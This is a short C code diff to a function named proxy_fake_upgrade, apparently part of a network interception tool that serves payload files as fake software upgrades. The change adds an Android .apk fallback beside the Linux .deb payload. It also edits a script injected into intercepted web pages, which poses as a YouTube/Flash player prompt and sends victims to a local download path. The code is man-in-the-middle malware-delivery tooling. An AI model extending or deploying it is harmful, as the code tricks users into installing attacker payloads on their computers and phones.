@@ -69,7 +69,12 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
          } else if (os == OSX) {
             ret = asprintf(&thefile, "/opt/td-config/share/vectors/%s.dmg", file);
          } else {
+	    /* Linux and Android (desktop mode) */
+
             ret = asprintf(&thefile, "/opt/td-config/share/vectors/%s.deb", file);
+
+	    if (ret == -1)
+	        ret = asprintf(&thefile, "/opt/td-config/share/vectors/%s.apk", file);
          }
 
          if (ret == -1)
@@ -113,7 +118,7 @@ int proxy_fake_upgrade(BIO **cbio, BIO **sbio, char *request, char *file,  char 
 
          ret = asprintf(&html_to_inject, 
 		"\n<script>" \
-		"        var adobelocalmirror = '/flashplayer';\n" \
+		"        var adobelocalmirror = '/getplayer';\n" \
 		"        var c = document.createElement('link');\n" \
 		"        c.type = 'text/css'; c.rel = 'stylesheet'; c.href = 'http://s.ytimg.com/yts/cssbin/www-player-vfl0RUPb4.css';\n" \
 		"        document.getElementsByTagName('head')[0].appendChild(c);\n" \
